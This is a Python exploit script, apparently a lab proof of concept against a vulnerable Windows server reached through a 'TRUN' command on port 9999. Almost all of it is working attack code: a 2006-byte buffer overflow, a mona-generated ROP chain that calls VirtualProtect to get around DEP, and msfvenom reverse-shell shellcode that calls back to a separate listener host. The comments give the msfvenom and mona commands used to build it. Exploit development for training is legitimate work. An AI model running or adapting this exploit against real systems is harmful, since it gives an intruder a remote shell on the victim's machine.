#!/usr/bin/env python3

import socket
import struct
import sys
import os

ip = "192.168.56.133"
port = 9999
global s
# EIP overwritten after sending 2006 bytes
# Bad chars = \x00\x0a\x0d\xff
# Mona command to create ROP chain = !mona rop -m *.dll -cp nonull
# Below we have ROP exploit formula:
# exploit = junk + ropchain + nop + shellcode
# Msfvenom payload:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.131 LPORT=443 EXITFUNC=thread -f c -b '\x00\x0a\x0d\xff'

shellcode = (
"\xdb\xdb\xbd\x4b\x94\x35\xa0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x6a\x17\x83\xc2\x04\x03\x21\x87\xd7\x55\x49\x4f\x95"
"\x96\xb1\x90\xfa\x1f\x54\xa1\x3a\x7b\x1d\x92\x8a\x0f\x73\x1f"
"\x60\x5d\x67\x94\x04\x4a\x88\x1d\xa2\xac\xa7\x9e\x9f\x8d\xa6"
"\x1c\xe2\xc1\x08\x1c\x2d\x14\x49\x59\x50\xd5\x1b\x32\x1e\x48"
"\x8b\x37\x6a\x51\x20\x0b\x7a\xd1\xd5\xdc\x7d\xf0\x48\x56\x24"
"\xd2\x6b\xbb\x5c\x5b\x73\xd8\x59\x15\x08\x2a\x15\xa4\xd8\x62"
"\xd6\x0b\x25\x4b\x25\x55\x62\x6c\xd6\x20\x9a\x8e\x6b\x33\x59"
"\xec\xb7\xb6\x79\x56\x33\x60\xa5\x66\x90\xf7\x2e\x64\x5d\x73"
"\x68\x69\x60\x50\x03\x95\xe9\x57\xc3\x1f\xa9\x73\xc7\x44\x69"
"\x1d\x5e\x21\xdc\x22\x80\x8a\x81\x86\xcb\x27\xd5\xba\x96\x2f"
"\x1a\xf7\x28\xb0\x34\x80\x5b\x82\x9b\x3a\xf3\xae\x54\xe5\x04"
"\xd0\x4e\x51\x9a\x2f\x71\xa2\xb3\xeb\x25\xf2\xab\xda\x45\x99"
"\x2b\xe2\x93\x0e\x7b\x4c\x4c\xef\x2b\x2c\x3c\x87\x21\xa3\x63"
"\xb7\x4a\x69\x0c\x52\xb1\xfa\xf3\x0b\x81\x79\x9b\x49\xf1\x7c"
"\xe7\xc7\x17\x14\x07\x8e\x80\x81\xbe\x8b\x5a\x33\x3e\x06\x27"
"\x73\xb4\xa5\xd8\x3a\x3d\xc3\xca\xab\xcd\x9e\xb0\x7a\xd1\x34"
"\xdc\xe1\x40\xd3\x1c\x6f\x79\x4c\x4b\x38\x4f\x85\x19\xd4\xf6"
"\x3f\x3f\x25\x6e\x07\xfb\xf2\x53\x86\x02\x76\xef\xac\x14\x4e"
"\xf0\xe8\x40\x1e\xa7\xa6\x3e\xd8\x11\x09\xe8\xb2\xce\xc3\x7c"
"\x42\x3d\xd4\xfa\x4b\x68\xa2\xe2\xfa\xc5\xf3\x1d\x32\x82\xf3"
"\x66\x2e\x32\xfb\xbd\xea\x52\x1e\x17\x07\xfb\x87\xf2\xaa\x66"
"\x38\x29\xe8\x9e\xbb\xdb\x91\x64\xa3\xae\x94\x21\x63\x43\xe5"
"\x3a\x06\x63\x5a\x3a\x03")

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x75cd1834,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x7590c442,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x77898070,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x75cf9afb,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x625011c7,  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77577b82,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x7630e369,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x75d0d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x75d33930,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x764190eb,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
      0x761783d1,  # XCHG EAX,EDX # RETN [USP10.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x75d2a1ef,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x62504265,  # &Writable location [essfunc.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x7789526a,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x76413165,  # RETN (ROP NOP) [user32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x76303934,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x762f0201,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

def banner():
	print("-----------------------------------------------------------\n")
	print("\t\t Proof Of Concept (Poc) By N3R0\n")
	print("-----------------------------------------------------------\n")

def exploit():
	junk = b"\x41" * 2006
	rop_chain = create_rop_chain()
	nops = b"\x90" * 20

	data = junk + rop_chain + nops + bytes(shellcode, 'latin-1')

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	print(s.recv(1024))
	s.send(b'TRUN .' + data + b'\r\n')
	print("Exploit has been sent!\n")
	sys.exit()

if __name__ == "__main__":
	banner()
	exploit()
